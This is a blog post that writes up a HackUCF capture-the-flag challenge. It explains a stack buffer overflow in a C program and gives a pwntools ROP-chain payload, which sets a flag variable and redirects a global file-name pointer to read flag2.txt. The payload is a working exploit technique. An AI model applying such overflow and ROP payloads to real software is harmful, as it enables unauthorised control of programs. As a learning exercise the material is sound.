---
layout: post
title: Global Variable Overwrite
description:
date: 2025-07-28
categories:
  - writeup
tags:
  - stack
---
# Exploit Write-up: Buffer Overflow with Global Variable Control

[Challenge](https://ctf.hackucf.org/challenges#stack0%20pt2)

### Overview

In this challenge, we are given a C program that contains a **buffer overflow vulnerability** in the `func()` function. The goal is to exploit this vulnerability to print the contents of the correct flag file, `flag2.txt`, even though the binary is hardcoded to open `flag1.txt`.

---

### Source Code Summary

```c
static const char* flagfile = "flag1.txt";

static void giveFlag(void) {
    char flag[64];
    FILE* fp = fopen(flagfile, "r");
    if (!fp) {
        perror(flagfile);
        return;
    }
    fgets(flag, sizeof(flag), fp);
    fclose(fp);
    printf("Here is your first flag: %s\n", flag);
}
```

In `giveFlag()`, the program uses a **global variable `flagfile`** to open the flag file. Our goal is to make it open `flag2.txt` instead.

---

### Vulnerability

In `func()`:

```c
void func(void) {
    bool didPurchase = false;
    char input[50];

    printf("Debug info: Address of input buffer = %p\n", input);
    read(STDIN_FILENO, input, 1024);

    if (didPurchase) {
        printf("Thank you for purchasing Hackersoft Powersploit!\n");
        giveFlag();
    } else {
        printf("This program has not been purchased.\n");
    }
}
```

- `input` is a 50-byte buffer.
- The program reads **1024 bytes** into it using `read()`, which causes a **stack-based buffer overflow**.
- `didPurchase` is right before `input` on the stack, so it can be overwritten.
- After that, the **return address can also be overwritten**.

---

### Exploitation Plan
1. **Overwrite `didPurchase`** to `true` so that `giveFlag()` is called.
2. **Overwrite the global variable `flagfile`** to point to `"flag2.txt"` instead of `"flag1.txt"`.
---
### Step-by-Step Exploitation
#### Step 1: Overwrite `didPurchase`
- Since `didPurchase` is right above `input`, the first byte of overflow can flip it to non-zero (`true`).
#### Step 2: Overwrite `flagfile`
- `flagfile` is a global pointer. So we can overwrite it with a pointer to `"flag2.txt"` stored in our buffer.
#### Step 3: Use ROP to overwrite `flagfile`

- Since we control the return address, we can craft a **ROP chain** to write the address of `"flag2.txt"` into the `flagfile` global variable.
- 
ROP gadget Used:

```
0x08049400 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
```

Payload:
```python
payload = flat(
	cyclic(63), # bytes to fill buffer up to EIP
	# write flag2.txt to writable memory
	read_, # read function address from giveflag function
	gadget, #  pop ebx ; pop esi ; pop edi ; pop ebp ; ret
	0, # stdin
	bss, # buf address where is will be store (writeable memory)
	11, # len
	0x0, # junk
	#overwrite the flagfile variable pointer
	read_, # read function address from giveflag function
	gadget, #  pop ebx ; pop esi ; pop edi ; pop ebp ; ret
	0, # stdin
	flagfile_addr_ptr, # hardcoded flagfile addr
	0x0,
	giveFlag, # giveflag function ptr
)
```

[Full Exploit Script](https://github.com/tibane0/ctf-pwn/blob/main/hackucf/stack0_pt2/xlp.py)

---

### Lessons Learned

- Global variables can be overwritten indirectly through buffer overflows.